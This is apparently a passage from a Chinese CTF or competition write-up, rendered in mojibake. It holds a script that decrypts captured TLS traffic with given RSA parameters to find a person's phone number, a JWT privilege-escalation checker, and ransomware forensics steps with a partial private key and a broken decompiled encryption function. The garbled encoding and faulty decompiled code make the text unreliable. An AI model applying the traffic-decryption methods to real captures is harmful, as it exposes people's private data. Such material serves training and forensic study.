¹æ®ä¸Šé¢é¢˜ç›®å¯¹æ¯ä¸ªæµé‡åŒ…è¿›è¡Œè§£å¯†ï¼Œå¹¶å¾—åˆ°æ˜æ–‡ã€‚è¯·é€‰æ‰‹æ‰¾åˆ°\u0026quot;ç‹æ¢…\u0026quot;çš„æ‰‹æœºå·ï¼Œå¹¶è¿›è¡Œç­”æ¡ˆæäº¤ã€‚\nã€ç­”æ¡ˆæ ‡å‡†ã€‘è‹¥æ‰¾åˆ°\u0026quot;ç‹æ¢…\u0026quot;çš„æ‰‹æœºå·ä¸º15306364252ï¼Œåˆ™ç­”æ¡ˆæäº¤ä¸º15306364252\nè§£ç­” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 \u0026#34;\u0026#34;\u0026#34; HTTPS æµé‡è§£å¯†è„šæœ¬ï¼ˆåŸºäºå·²çŸ¥ RSA ç§é’¥å‚æ•° e/p/qï¼‰ ã€åŸç†è¯´æ˜ã€‘ TLS/HTTPS æ¡æ‰‹ä¸­ï¼Œå®¢æˆ·ç«¯ç”Ÿæˆ48å­—èŠ‚é¢„ä¸»å¯†é’¥(Pre-Master Secret)ï¼Œç”¨æœåŠ¡å™¨RSAå…¬é’¥åŠ å¯†åå‘é€ã€‚ å·²çŸ¥RSAå‚æ•°(e,p,q)å¯ä»¥ï¼š 1. è®¡ç®—ç§é’¥ d = e^(-1) mod Ï†(n) 2. è§£å¯†é¢„ä¸»å¯†é’¥ 3. æ´¾ç”Ÿä¼šè¯å¯†é’¥å¹¶è§£å¯†åº”ç”¨æ•°æ® ã€TLS 1.2 å¯†é’¥æ´¾ç”Ÿã€‘ Pre-Master Secret â†’ PRF(\u0026#34;master secret\u0026#34;) â†’ Master Secret â†’ PRF(\u0026#34;key expansion\u0026#34;) â†’ Key Block \u0026#34;\u0026#34;\u0026#34; import os import re import csv import glob import hmac import struct import hashlib import warnings from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long from Crypto.Cipher import AES from scapy.all import rdpcap, Raw warnings.filterwarnings(\u0026#34;ignore\u0026#34;) # ========================= é…ç½® ========================= PCAP_DIR = r\u0026#34;C:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\æ•°æ®æº¯æº\\pcap\u0026#34; PARAMS_FILE = r\u0026#34;C:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\æ•°æ®æº¯æº\\params.csv\u0026#34; # ========================= TLS PRF ========================= def prf_sha256(secret, label, seed, length): \u0026#34;\u0026#34;\u0026#34;TLS 1.2 PRF (P_SHA256): è¿­ä»£HMACç”ŸæˆæŒ‡å®šé•¿åº¦çš„å¯†é’¥ææ–™\u0026#34;\u0026#34;\u0026#34; result, a = b\u0026#39;\u0026#39;, hmac.new(secret, label + seed, hashlib.sha256).digest() while len(result) \u0026lt; length: result += hmac.new(secret, a + label + seed, hashlib.sha256).digest() a = hmac.new(secret, a, hashlib.sha256).digest() return result[:length] # ========================= RSAå‚æ•°åŠ è½½ ========================= def load_rsa_params(params_file): \u0026#34;\u0026#34;\u0026#34;åŠ è½½RSAå‚æ•°ï¼Œé¢„è®¡ç®—ç§é’¥dï¼Œè¿”å› (paramså­—å…¸, n_bytesæ˜ å°„)\u0026#34;\u0026#34;\u0026#34; params, n_bytes_map = {}, {} with open(params_file, \u0026#39;r\u0026#39;) as f: for row in csv.DictReader(f): id_, e, p, q = int(row[\u0026#39;id\u0026#39;]), int(row[\u0026#39;e\u0026#39;]), int(row[\u0026#39;p\u0026#39;]), int(row[\u0026#39;q\u0026#39;]) n = p * q d = inverse(e, (p - 1) * (q - 1)) params[id_] = {\u0026#39;n\u0026#39;: n, \u0026#39;d\u0026#39;: d} n_bytes_map[long_to_bytes(n)] = id_ return params, n_bytes_map # ========================= TLSè§£æ ========================= def parse_tls_records(data): \u0026#34;\u0026#34;\u0026#34; è§£æTLSè®°å½•å±‚ æ ¼å¼: ContentType(1) + Version(2) + Length(2) + Payload ContentType: 22=æ¡æ‰‹, 23=åº”ç”¨æ•°æ® \u0026#34;\u0026#34;\u0026#34; records, offset = [], 0 while offset \u0026lt; len(data) - 5: ctype, length = data[offset], struct.unpack(\u0026#39;\u0026gt;H\u0026#39;, data[offset+3:offset+5])[0] if offset + 5 + length \u0026gt; len(data): break records.append({\u0026#39;type\u0026#39;: ctype, \u0026#39;payload\u0026#39;: data[offset+5:offset+5+length]}) offset += 5 + length return records def parse_handshakes(payload): \u0026#34;\u0026#34;\u0026#34; è§£ææ¡æ‰‹æ¶ˆæ¯ æ ¼å¼: Type(1) + Length(3) + Data Type: 1=ClientHello, 2=ServerHello, 16=ClientKeyExchange \u0026#34;\u0026#34;\u0026#34; messages, offset = [], 0 while offset \u0026lt; len(payload) - 4: hs_type = payload[offset] length = struct.unpack(\u0026#39;\u0026gt;I\u0026#39;, b\u0026#39;\\x00\u0026#39; + payload[offset+1:offset+4])[0] messages.append({\u0026#39;type\u0026#39;: hs_type, \u0026#39;data\u0026#39;: payload[offset+4:offset+4+length]}) offset += 4 + length return messages def extract_tls_data(packets): \u0026#34;\u0026#34;\u0026#34;ä»æ•°æ®åŒ…ä¸­æå–TLSæ¡æ‰‹æ•°æ®å’Œåº”ç”¨æ•°æ®\u0026#34;\u0026#34;\u0026#34; client_random = server_random = encrypted_pms = cipher_suite = None app_data_list = [] for pkt in packets: if not pkt.haslayer(Raw): continue for record in parse_tls_records(bytes(pkt[Raw])): if record[\u0026#39;type\u0026#39;] == 22: # æ¡æ‰‹ for hs in parse_handshakes(record[\u0026#39;payload\u0026#39;]): data = hs[\u0026#39;data\u0026#39;] if hs[\u0026#39;type\u0026#39;] == 1 and len(data) \u0026gt;= 34: # ClientHello client_random = data[2:34] elif hs[\u0026#39;type\u0026#39;] == 2 and len(data) \u0026gt;= 34: # ServerHello server_random = data[2:34] if len(data) \u0026gt;= 37: sid_len = data[34] if len(data) \u0026gt;= 37 + sid_len: cipher_suite = struct.unpack(\u0026#39;\u0026gt;H\u0026#39;, data[35+sid_len:37+sid_len])[0] elif hs[\u0026#39;type\u0026#39;] == 16 and len(data) \u0026gt;= 2: # ClientKeyExchange pms_len = struct.unpack(\u0026#39;\u0026gt;H\u0026#39;, data[0:2])[0] if len(data) \u0026gt;= 2 + pms_len: encrypted_pms = data[2:2+pms_len] elif record[\u0026#39;type\u0026#39;] == 23: # åº”ç”¨æ•°æ® app_data_list.append(record[\u0026#39;payload\u0026#39;]) return client_random, server_random, encrypted_pms, cipher_suite, app_data_list # ========================= RSAè§£å¯† ========================= def rsa_decrypt_pms(encrypted_pms, n, d): \u0026#34;\u0026#34;\u0026#34;RSAè§£å¯†é¢„ä¸»å¯†é’¥ï¼Œå»é™¤PKCS#1 v1.5å¡«å…… (00 02 [padding] 00 [data])\u0026#34;\u0026#34;\u0026#34; m = pow(bytes_to_long(encrypted_pms), d, n) decrypted = long_to_bytes(m) # å»é™¤PKCS#1 v1.5å¡«å…… if len(decrypted) \u0026gt; 11 and decrypted[:2] == b\u0026#39;\\x00\\x02\u0026#39;: sep = decrypted.find(b\u0026#39;\\x00\u0026#39;, 2) pms = decrypted[sep+1:] if sep \u0026gt;= 10 else decrypted[-48:] else: pms = decrypted[-48:] if len(decrypted) \u0026gt;= 48 else decrypted return pms if len(pms) == 48 else None # ========================= ä¼šè¯å¯†é’¥æ´¾ç”Ÿ ========================= def derive_keys(pms, client_random, server_random, is_gcm): \u0026#34;\u0026#34;\u0026#34;æ´¾ç”Ÿä¸»å¯†é’¥å’Œä¼šè¯å¯†é’¥\u0026#34;\u0026#34;\u0026#34; master = prf_sha256(pms, b\u0026#34;master secret\u0026#34;, client_random + server_random, 48) if is_gcm: # AES-GCM: key(16) + key(16) + iv(4) + iv(4) = 40 bytes kb = prf_sha256(master, b\u0026#34;key expansion\u0026#34;, server_random + client_random, 40) return kb[0:16], kb[16:32], kb[32:36], kb[36:40] else: # AES-CBC: mac(20) + mac(20) + key(16) + key(16) = 72 bytes (TLS 1.1+ ä½¿ç”¨æ˜¾å¼IV) kb = prf_sha256(master, b\u0026#34;key expansion\u0026#34;, server_random + client_random, 72) return kb[40:56], kb[56:72], None, None # ========================= åº”ç”¨æ•°æ®è§£å¯† ========================= def decrypt_app_data(app_data_list, client_key, server_key, client_iv, server_iv, is_gcm): \u0026#34;\u0026#34;\u0026#34;è§£å¯†åº”ç”¨å±‚æ•°æ®\u0026#34;\u0026#34;\u0026#34; results = [] for data in app_data_list: if len(data) \u0026lt; 16: continue if is_gcm: from cryptography.hazmat.primitives.ciphers.aead import AESGCM explicit_nonce, ciphertext = data[:8], data[8:] for key, iv in [(client_key, client_iv), (server_key, server_iv)]: nonce = iv + explicit_nonce for seq in range(20): # å°è¯•ä¸åŒåºåˆ—å· aad = struct.pack(\u0026#39;\u0026gt;Q\u0026#39;, seq) + b\u0026#39;\\x17\\x03\\x03\u0026#39; + struct.pack(\u0026#39;\u0026gt;H\u0026#39;, len(ciphertext) - 16) try: results.append(AESGCM(key).decrypt(nonce, ciphertext, aad).decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;)) break except: pass else: continue break else: # AES-CBC (TLS 1.1+ æ˜¾å¼IV) iv, ciphertext = data[:16], data[16:] for key in [client_key, server_key]: try: decrypted = AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext) pad = decrypted[-1] if 0 \u0026lt; pad \u0026lt;= 16 and all(b == pad for b in decrypted[-pad:]): plaintext = decrypted[:-pad-20] # å»é™¤å¡«å……å’ŒMAC(SHA1=20) results.append(plaintext.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;)) break except: pass return results # ========================= æ ¸å¿ƒè§£å¯†å‡½æ•° ========================= def decrypt_pcap(pcap_file, params, n_bytes_map): \u0026#34;\u0026#34;\u0026#34;è§£å¯†å•ä¸ªpcapæ–‡ä»¶\u0026#34;\u0026#34;\u0026#34; packets = rdpcap(pcap_file) # æ”¶é›†åŸå§‹æ•°æ®å¹¶åŒ¹é…RSAå‚æ•° all_raw = b\u0026#39;\u0026#39;.join(bytes(pkt[Raw]) for pkt in packets if pkt.haslayer(Raw)) if not all_raw: return None matched_id = next((id_ for n_bytes, id_ in n_bytes_map.items() if n_bytes in all_raw), None) if not matched_id: return None n, d = params[matched_id][\u0026#39;n\u0026#39;], params[matched_id][\u0026#39;d\u0026#39;] # æå–TLSæ•°æ® client_random, server_random, encrypted_pms, cipher_suite, app_data_list = extract_tls_data(packets) if not all([client_random, server_random, encrypted_pms, app_data_list]): return None # è§£å¯†é¢„ä¸»å¯†é’¥ pms = rsa_decrypt_pms(encrypted_pms, n, d) if not pms: return None # æ´¾ç”Ÿå¯†é’¥å¹¶è§£å¯† is_gcm = cipher_suite in [0x009C, 0x009D] client_key, server_key, client_iv, server_iv = derive_keys(pms, client_random, server_random, is_gcm) return decrypt_app_data(app_data_list, client_key, server_key, client_iv, server_iv, is_gcm) # ========================= ä¸»ç¨‹åº ========================= if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;ğŸ“– è¯»å–RSAå‚æ•°...\u0026#34;) params, n_bytes_map = load_rsa_params(PARAMS_FILE) print(f\u0026#34;âœ… å…±è¯»å– {len(params)} ç»„RSAå‚æ•°\u0026#34;) pcap_files = glob.glob(os.path.join(PCAP_DIR, \u0026#34;*.pcap\u0026#34;)) print(f\u0026#34;ğŸ“ æ‰¾åˆ° {len(pcap_files)} ä¸ªpcapæ–‡ä»¶\u0026#34;) all_results, success = [], 0 for i, pcap_file in enumerate(pcap_files): name = os.path.basename(pcap_file) try: texts = decrypt_pcap(pcap_file, params, n_bytes_map) if texts: success += 1 for text in texts: all_results.append((name, text)) if \u0026#39;ç‹æ¢…\u0026#39; in text or \u0026#39;\\\\u738b\\\\u6885\u0026#39; in text: print(f\u0026#34;\\nğŸ¯ [æ‰¾åˆ°ç›®æ ‡!] {name}\\n{text[:500]}\u0026#34;) match = re.search(r\u0026#39;\u0026#34;phone\u0026#34;:\\s*\u0026#34;(\\d+)\u0026#34;\u0026#39;, text) if match: print(f\u0026#34;ğŸ“± æ‰‹æœºå·: {match.group(1)}\u0026#34;) except: pass if (i + 1) % 50 == 0: print(f\u0026#34;â³ å·²å¤„ç† {i+1}/{len(pcap_files)}ï¼ŒæˆåŠŸ {success} ä¸ª...\u0026#34;) print(f\u0026#34;\\n{\u0026#39;=\u0026#39;*60}\u0026#34;) print(f\u0026#34;âœ… å®Œæˆï¼å¤„ç† {len(pcap_files)} æ–‡ä»¶ï¼ŒæˆåŠŸ {success} ä¸ªï¼Œå…± {len(all_results)} æ¡è®°å½•\u0026#34;) output = os.path.join(os.path.dirname(PCAP_DIR), \u0026#34;all_decrypted_new.txt\u0026#34;) with open(output, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: for name, text in all_results: f.write(f\u0026#34;=== {name} ===\\n{text}\\n\\n\u0026#34;) print(f\u0026#34;ğŸ“„ å·²ä¿å­˜åˆ° {output}\u0026#34;) æ•°æ®æ ¸éªŒ é¢˜ç›® ä¸ºäº†å®‰å…¨å¯é ï¼Œè¯¥ç³»ç»Ÿåœ¨è¯·æ±‚åŒ…è®¾ç½®äº†Authorizationå¤´éƒ¨å­—æ®µã€‚è¯¥å­—æ®µæ˜¯ä½¿ç”¨JWTè¿›è¡ŒåŠ å¯†çš„ï¼Œæ¯ä¸ªäººçš„å¯†é’¥ä¸ºäº†å®‰å…¨è€ƒè™‘è®¾ç½®æˆè‡ªå·±å§“åçš„æ‹¼éŸ³ã€‚è¯·é€‰æ‰‹è§£å¯†JWTèº«ä»½è®¤è¯æ ¸å¯¹ä¿¡æ¯æ˜¯å¦ä¸è¯·æ±‚ä½“ä¸­çš„å†…å®¹æ˜¯å¦ä¸€è‡´ã€‚è‹¥éä¸€è‡´ï¼Œè¯¥ç”¨æˆ·å¯èƒ½åœ¨è¿›è¡Œè¶Šæƒè®¿é—®ã€‚è¯·é€‰æ‰‹ç»Ÿè®¡å‡ºæœ‰å¤šå°‘ä¸ªè´¦å·è¿›è¡Œè¶Šæƒã€‚\nã€ç­”æ¡ˆæ ‡å‡†ã€‘\nè‹¥æœ‰101ä¸ªè´¦å·è¿›è¡Œè¶Šæƒï¼Œåˆ™ç­”æ¡ˆæäº¤ä¸º101\nè§£ç­” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 \u0026#34;\u0026#34;\u0026#34; JWT è¶Šæƒè®¿é—®æ£€æµ‹è„šæœ¬ ã€åŠŸèƒ½è¯´æ˜ã€‘ æ£€æµ‹HTTPSè¯·æ±‚ä¸­æ˜¯å¦å­˜åœ¨è¶Šæƒè®¿é—®ï¼š - è§£æè§£å¯†åçš„HTTPè¯·æ±‚ - æ¯”è¾ƒJWTä»¤ç‰Œä¸­çš„ç”¨æˆ·ä¿¡æ¯ä¸è¯·æ±‚ä½“ä¸­çš„ç”¨æˆ·ä¿¡æ¯ - å¦‚æœä¸ä¸€è‡´ï¼Œè¯´æ˜ç”¨æˆ·Aä½¿ç”¨è‡ªå·±çš„JWTè®¿é—®ç”¨æˆ·Bçš„æ•°æ®ï¼ˆè¶Šæƒï¼‰ ã€JWTç»“æ„ã€‘ JWTç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç”¨.åˆ†éš”ï¼šHeader.Payload.Signature - Header: {\u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;} - Payload: {\u0026#34;username\u0026#34;: \u0026#34;xxx\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;xxx\u0026#34;} (ç”¨æˆ·ä¿¡æ¯) - Signature: HMAC-SHA256ç­¾å ã€è¶Šæƒåˆ¤å®šã€‘ è‹¥ JWT.payload.username â‰  Body.username æˆ– JWT.payload.phone â‰  Body.phone åˆ™åˆ¤å®šä¸ºè¶Šæƒè®¿é—®ï¼ˆç”¨æˆ·è¯•å›¾ä¿®æ”¹ä»–äººæ•°æ®ï¼‰ \u0026#34;\u0026#34;\u0026#34; import re import json import base64 import hashlib def base64url_decode(data): \u0026#34;\u0026#34;\u0026#34;Base64URLè§£ç ï¼ˆè‡ªåŠ¨è¡¥é½paddingï¼‰\u0026#34;\u0026#34;\u0026#34; padding = 4 - len(data) % 4 if padding != 4: data += \u0026#39;=\u0026#39; * padding return base64.urlsafe_b64decode(data) def decode_jwt_payload(token): \u0026#34;\u0026#34;\u0026#34; è§£ç JWTçš„Payloadéƒ¨åˆ†ï¼ˆä¸éªŒè¯ç­¾åï¼‰ JWTæ ¼å¼: header.payload.signature Payloadæ˜¯Base64URLç¼–ç çš„JSON \u0026#34;\u0026#34;\u0026#34; try: parts = token.split(\u0026#39;.\u0026#39;) if len(parts) != 3: return None return json.loads(base64url_decode(parts[1]).decode(\u0026#39;utf-8\u0026#39;)) except: return None def parse_decrypted_file(content): \u0026#34;\u0026#34;\u0026#34; è§£æè§£å¯†æ–‡ä»¶ï¼Œæå–æ¯ä¸ªpcapå¯¹åº”çš„è¯·æ±‚å†…å®¹ æ–‡ä»¶æ ¼å¼: === xxx.pcap === HTTPè¯·æ±‚å†…å®¹... === yyy.pcap === HTTPè¯·æ±‚å†…å®¹... è¿”å›: [(pcap_name, request_content), ...] \u0026#34;\u0026#34;\u0026#34; pattern = r\u0026#39;=== ([^=]+\\.pcap) ===\u0026#39; parts = re.split(pattern, content) # partsç»“æ„: [\u0026#39;\u0026#39;, pcap1, content1, pcap2, content2, ...] return [(parts[i].strip(), parts[i + 1]) for i in range(1, len(parts), 2) if i + 1 \u0026lt; len(parts)] def extract_jwt_and_body(request): \u0026#34;\u0026#34;\u0026#34; ä»HTTPè¯·æ±‚ä¸­æå–JWTä»¤ç‰Œå’ŒJSONè¯·æ±‚ä½“ JWTä½ç½®: Authorization: Bearer \u0026lt;token\u0026gt; è¯·æ±‚ä½“: {\u0026#34;username\u0026#34;: \u0026#34;xxx\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;xxx\u0026#34;} \u0026#34;\u0026#34;\u0026#34; # æå–JWT jwt_match = re.search(r\u0026#39;Authorization: Bearer ([^\\s\\r\\n]+)\u0026#39;, request) jwt_token = jwt_match.group(1) if jwt_match else None # æå–JSONè¯·æ±‚ä½“ body_match = re.search(r\u0026#39;\\{[^{}]+\\}\u0026#39;, request) try: body = json.loads(body_match.group(0)) if body_match else None except: body = None return jwt_token, body def check_authorization(jwt_token, body): \u0026#34;\u0026#34;\u0026#34; æ£€æŸ¥æ˜¯å¦å­˜åœ¨è¶Šæƒè®¿é—® æ¯”è¾ƒJWTä¸­çš„ç”¨æˆ·ä¿¡æ¯ä¸è¯·æ±‚ä½“ä¸­çš„ç”¨æˆ·ä¿¡æ¯ è¿”å›: (is_unauthorized, jwt_info, body_info) \u0026#34;\u0026#34;\u0026#34; payload = decode_jwt_payload(jwt_token) if not payload: return None, None, None jwt_info = (payload.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;), payload.get(\u0026#39;phone\u0026#39;, \u0026#39;\u0026#39;)) body_info = (body.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;), body.get(\u0026#39;phone\u0026#39;, \u0026#39;\u0026#39;)) # è¶Šæƒåˆ¤å®šï¼šJWTä¸­çš„ç”¨æˆ·ä¿¡æ¯ä¸è¯·æ±‚ä½“ä¸ä¸€è‡´ is_unauthorized = jwt_info != body_info return is_unauthorized, jwt_info, body_info def main(): # è¯»å–è§£å¯†åçš„è¯·æ±‚æ•°æ® with open(\u0026#39;all_decrypted_new.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() requests = parse_decrypted_file(content) print(f\u0026#34;ğŸ“‚ å…±è§£æ {len(requests)} ä¸ªè¯·æ±‚\u0026#34;) unauthorized_list = [] for pcap_name, request_content in requests: jwt_token, body = extract_jwt_and_body(request_content) # è·³è¿‡æ— æ³•è§£æçš„è¯·æ±‚ if not jwt_token or not body: continue is_unauthorized, jwt_info, body_info = check_authorization(jwt_token, body) if is_unauthorized is None: print(f\u0026#34;[ERROR] {pcap_name}: JWTè§£ç å¤±è´¥\u0026#34;) continue if is_unauthorized: unauthorized_list.append({ \u0026#39;pcap\u0026#39;: pcap_name, \u0026#39;jwt\u0026#39;: {\u0026#39;username\u0026#39;: jwt_info[0], \u0026#39;phone\u0026#39;: jwt_info[1]}, \u0026#39;body\u0026#39;: {\u0026#39;username\u0026#39;: body_info[0], \u0026#39;phone\u0026#39;: body_info[1]} }) print(f\u0026#34;ğŸš¨ [è¶Šæƒ] {pcap_name}\u0026#34;) print(f\u0026#34; JWT: username={jwt_info[0]}, phone={jwt_info[1]}\u0026#34;) print(f\u0026#34; Body: username={body_info[0]}, phone={body_info[1]}\u0026#34;) # è¾“å‡ºç»Ÿè®¡ç»“æœ count = len(unauthorized_list) print(f\u0026#34;\\n{\u0026#39;=\u0026#39;*50}\u0026#34;) print(f\u0026#34;âœ… æ£€æµ‹å®Œæˆï¼å‘ç° {count} ä¸ªè¶Šæƒè®¿é—®\u0026#34;) print(f\u0026#34;ğŸ”‘ ç­”æ¡ˆMD5: {hashlib.md5(str(count).encode()).hexdigest()}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() æ–‡æ¡£å®‰å…¨äº‹ä»¶åˆ†æ éšç€ç»´çœŸç§‘æŠ€(VerityTech)ä¸šåŠ¡è§„æ¨¡çš„ä¸æ–­æ‰©å¼ ï¼Œå…¬å¸ç§¯ç´¯äº†å¤§é‡å†…éƒ¨ PDF æ–‡æ¡£ï¼ŒåŒ…æ‹¬é‡è¦çš„ç ”å‘èµ„æ–™ã€ä¸šåŠ¡æŠ¥å‘Šã€å†…éƒ¨åˆ¶åº¦è¯´æ˜ç­‰ã€‚åœ¨é•¿æœŸçš„è¿ä½œè¿‡ç¨‹ä¸­ï¼Œç”±äºæ–‡æ¡£ç®¡ç†è§„èŒƒä¸å®Œå–„ã€ç¼ºä¹ç»Ÿä¸€çš„å®‰å…¨ç­–ç•¥ï¼Œå…¬å¸æ–‡æ¡£çš„å®‰å…¨é£é™©é€æ¸æ˜¾ç°ã€‚\nè¿‘æœŸï¼Œå…¬å¸æ–‡æ¡£æœåŠ¡å™¨é­é‡æœªçŸ¥å‹’ç´¢ç¨‹åºæ”»å‡»ã€‚éƒ¨åˆ† PDF æ–‡ä»¶è¢«åŠ å¯†æ— æ³•æ‰“å¼€ï¼Œç³»ç»Ÿä¸­è¿˜å‡ºç°å¯ç–‘é“¾æ¥çš„æ–‡æ¡£ï¼Œç–‘ä¼¼ä¸ºæ”»å‡»å…¥å£ã€‚åŒæ—¶ï¼Œå®‰å…¨å›¢é˜Ÿåœ¨å—æ„ŸæŸ“ç»ˆç«¯ä¸­æå–åˆ°äº†ä¸€ä»½å¯ç–‘çš„å¯æ‰§è¡Œç¨‹åº(exe æ–‡ä»¶)ï¼Œæ¨æµ‹ä¸ºå‹’ç´¢ç¨‹åºä¸»ä½“ã€‚\nä¸ºäº†å®šä½å®‰å…¨æ¼æ´ã€æ¢å¤æ–‡æ¡£æ•°æ®ã€æŸ¥æ˜æ”»å‡»æ¥æºï¼Œå…¬å¸å¯åŠ¨äº†â€œæ–‡æ¡£å®‰å…¨äº‹ä»¶åˆ†æâ€:ä¸“é¡¹å·¥ä½œã€‚æœ¬é¢˜ç»™å‡ºæ”»å‡»æ ·æœ¬ã€åŠ å¯†æ–‡æ¡£åŠç–‘ä¼¼é’“é±¼ PDF æ–‡æ¡£ï¼Œè¯·ä½ ååŠ©å®‰å…¨å›¢é˜Ÿè¿›è¡Œå–è¯åˆ†æã€å¯†é’¥æ¢å¤ã€æ•°æ®è§£å¯†ä»¥åŠé’“é±¼é“¾æ¥è¯†åˆ«ã€‚\nå…¬å¸åˆæ³•åŸŸåä¸º:veritytech.comä»¥åŠå…¶å­åŸŸ:\n*.veritytech.comå…¶ä½™åŸŸåå‡è§†ä¸ºå¯ç–‘é“¾æ¥ï¼Œéœ€é‡ç‚¹å®¡æŸ¥ã€‚\nå¯†é’¥å–è¯ é¢˜ç›® å®‰å…¨å›¢é˜Ÿæå–åˆ°ç–‘ä¼¼å‹’ç´¢ç¨‹åº(exe æ–‡ä»¶)ï¼Œè¯¥ç¨‹åºé‡‡ç”¨\u0026quot;æ··åˆåŠ å¯†æœºåˆ¶\u0026quot;å¯¹ PDF æ–‡æ¡£è¿›è¡ŒåŠ å¯†ä½¿ç”¨\nRSA å…¬é’¥åŠ å¯† AES å¯†é’¥(ç”¨äºå®‰å…¨å­˜å‚¨/ä¼ è¾“ AES å¯†é’¥); ä½¿ç”¨åŸå§‹çš„ AES å¯†é’¥(æ˜æ–‡)ç›´æ¥åŠ å¯† PDF æ–‡æ¡£ã€‚ è‹¥è¦æ¢å¤æ–‡æ¡£ï¼Œå¿…é¡»ä»å‹’ç´¢ç¨‹åºä¸­è·å–æ”»å‡»è€…é—ç•™çš„ RSA ç§é’¥ã€‚\nè¯·ä½ åˆ†æå‹’ç´¢ç¨‹åºï¼Œæ‰¾åˆ°ç§é’¥ï¼Œå¹¶å°†ç§é’¥ä¸­\u0026quot;\u0026mdash;-BEGIN PRIVATE KEY\u0026ndash;â€¦â€¦\u0026ldquo;ä¹‹åçš„32ä¸ºå­—ç¬¦å½“åšç­”æ¡ˆæäº¤ã€‚\nè§£ç­” ç”¨è®°äº‹æœ¬æ‰“å¼€exeæ–‡ä»¶ï¼Œå‘ç°é‡Œé¢æœ‰pythonå…³é”®å­—ï¼Œåˆ¤æ–­ä¸ºpythonæ‰“åŒ…çš„exeæ–‡ä»¶\nä½¿ç”¨pyinstxtractor.pyè§£åŒ…ï¼Œæ‰¾åˆ°key\n1 2 3 -----BEGIN PRIVATE KEY----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCt4TrETrlzU4NV ... æ•°æ®è§£å¯† é¢˜ç›® åœ¨æˆåŠŸè·å¾—æ”»å‡»è€…çš„ RSA ç§é’¥åï¼Œå¯è§£å¯† AES å¯†é’¥ï¼Œå¹¶è¿›ä¸€æ­¥è§£å¯†è¢«å‹’ç´¢çš„ PDF æ–‡ä»¶ã€‚è¯·ä½¿ç”¨æ­£ç¡®çš„ç§é’¥æ¢å¤æ–‡ä»¶å†…å®¹ã€‚\nè¯·è®¡ç®—\u0026quot;0999_å†…éƒ¨æ–‡æ¡£0999.pdf\u0026quot;è§£å¯†å,æ–‡ä»¶çš„ MD5 å€¼ï¼Œå¹¶æäº¤å…¶ 32 ä½å°å†™ MD5 ä½œä¸ºç­”æ¡ˆã€‚\nè§£ç­” ä½¿ç”¨pycdc.exeåç¼–è¯‘en.exe_extracted\\encrypt_files.pycï¼ŒæŸ¥çœ‹ä½¿ç”¨çš„æ˜¯AESå“ªç§æ¨¡å¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # pycdc.exe encrypt_files.pyc \u0026gt; encrypt.py def encrypt_file_aes_ecb(file_path, aes_key, output_path = (None,)): \u0026#39;\u0026#39;\u0026#39; ä½¿ç”¨AES-256-ECBç®—æ³•åŠ å¯†æ–‡ä»¶ Args: file_path: è¦åŠ å¯†çš„æ–‡ä»¶è·¯å¾„ aes_key: AESå¯†é’¥ï¼ˆ32å­—èŠ‚ï¼‰ output_path: è¾“å‡ºæ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœä¸ºNoneåˆ™æ·»åŠ .encåç¼€ Returns: åŠ å¯†åçš„æ–‡ä»¶è·¯å¾„ \u0026#39;\u0026#39;\u0026#39; with open(file_path, \u0026#39;rb\u0026#39;) as f: plaintext = f.read() None(None, None, None) ç¼–å†™è§£å¯†ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 